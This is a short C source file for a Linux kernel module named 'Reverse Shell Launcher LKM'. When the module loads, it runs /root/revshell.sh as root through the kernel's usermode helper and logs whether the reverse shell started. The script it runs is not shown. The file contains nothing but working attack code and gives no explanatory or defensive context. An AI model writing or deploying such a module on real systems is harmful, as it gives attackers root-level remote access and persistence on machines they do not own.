#include <linux/module.h>
#include <linux/init.h>
#include <linux/kmod.h>
#include <linux/sched.h>
#include <linux/slab.h>

static int __init lkm_init(void) {
    char *argv[] = {"/bin/bash", "/root/revshell.sh", NULL};  // Script shell
    char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};

    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    if (ret != 0) {
        printk(KERN_ERR "Error launching revshell.sh: %d\n", ret);
    } else {
        printk(KERN_INFO "Reverse shell launched successfully.\n");
    }
    return 0;
}

static void __exit lkm_exit(void) {
    printk(KERN_INFO "Reverse shell LKM unloaded.\n");
}

module_init(lkm_init);
module_exit(lkm_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Victor");
MODULE_DESCRIPTION("Reverse Shell Launcher LKM");
